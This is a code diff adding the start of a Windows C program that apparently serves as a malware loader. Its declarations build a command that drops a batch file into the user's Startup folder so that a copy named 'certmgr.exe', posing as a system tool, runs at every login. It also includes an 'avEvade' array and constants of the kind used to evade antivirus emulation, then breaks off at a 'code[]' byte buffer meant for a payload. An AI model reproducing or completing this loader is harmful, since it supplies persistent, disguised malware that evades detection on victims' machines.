@@ -1,0 +1,22 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <windows.h>
+
+char var1[300];
+char var2[500]="copy \"";
+char var3[100];
+char var5[100]="\"C:\\Users\\%username%\\";
+char copy[500]="@echo \"C:\\Users\\%username%\\certmgr.exe\" > \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\certmgr.bat\"";
+
+int compt1 = 0;
+int compt2 = 0;
+int longu = 0;
+int position = 0;
+int avEvade[100];
+int longueur2 = 0;
+
+#define MAX_OP 10000000
+#define TOO_MUCH_MEM 10000000
+
+unsigned char code[] = 
